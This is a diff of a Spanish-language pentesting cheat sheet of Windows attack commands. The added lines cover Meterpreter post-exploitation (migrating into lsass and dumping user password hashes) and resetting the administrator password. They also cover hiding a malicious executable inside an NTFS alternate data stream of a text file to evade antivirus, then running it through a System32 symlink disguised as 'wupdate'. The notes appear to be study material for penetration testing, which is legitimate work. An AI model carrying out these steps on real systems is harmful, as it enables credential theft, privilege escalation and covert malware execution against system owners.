@@ -1,8 +1,9 @@
-# Comandos Windows ❮❯
+# Comandos Windows
 
 Tags: #Windows #Comandos 
 
 ## Comandos con Meterpreter
+
 ```bash 
 # Cuando tienes la sesion con Meterpreter 
 
@@ -11,14 +12,17 @@ Tags: #Windows #Comandos
 ❯ sessions -u <ID>           # Regresamos a la sesion 
 
 ❯ sysinfo                  # Muestra informacion del Windows 
-❯ pgrep explorer           # Mirar el numero del proceso 
+❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
+❯ pgrep lsass              # Mirar el numero del proceso y asi poder escalar privilegios 
 ❯ migrate <ID>             # Nos migramos al proceso 
  
-❯ getuid
+❯ getuid                   # Miramos el nombre del usuario 
 ❯ getprivs                 # Miramos los privilegios 
 ❯ getsystem                # Miras los procesos privilegiados 
 
 ❯ getprivs                 # Miramos los  procesos con privilegios
+
+❯ hashdump                 # Te muestra todos los hashes de los usuarios 
 ```
 
 
@@ -28,6 +32,7 @@ Tags: #Windows #Comandos
 ❯ net user                                   # Miramos todos los usuarios existentes y sus grupos
 ❯ net user <User>                            # Miramos el grupo de un usuario especifico
 ❯ net localgroup administrators              # Miramos los miembros del grupo administrador
+❯ net user admin password123                 # Para cambiar la passwd al usuario admin siendo NT Authority 
 ```
 ```bash
 ❯ .\file.exe               # Ejecutamos un arcxhivo .exe en Windows 
@@ -77,4 +82,20 @@ Tags: #Windows #Comandos
 	# smbFolder = Nombre del folder del recurso compartido
 	# File.exe = Nombre del archivo .exe a copiar de la maquina de atacante
 	# File.exe = Nombre del archivo .exe en el cual se depositara el archivo copiado
+```
+
+## Ocultar data en un archivo txt
+
+Esta forma de ocultar un .exe dentro de un archivo txt nos ayuda a evadir detecciones básicas, antivirus.
+
+```bash 
+❯ type payload.exe > windowslog.txt:winpeas.exe    # El archivo payload que contiene el programa malicioso se convertira en un archivo txt llamado windowslog visible y detras sera oculta su data renombrado como winpeas.exe
+❯ notepad windowslog.txt                           # Abrimos el archivo y es un archivo txt vacio, en el cual le podemos introducir cualquier data 
+❯ start windowslog.txt:winpeas.exe                 # Ejecutamos el winpeas que esta oculto en el archivo de texto 
+
+# Si no lo ejecuta, debemos de crear un enlace simbolico como NT Authority 
+❯ cd windows\System32
+❯ mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe       # Crear el enlace simbolico  
+
+❯ wupdate                                                     # Ejecutar el programa                                               
 ```
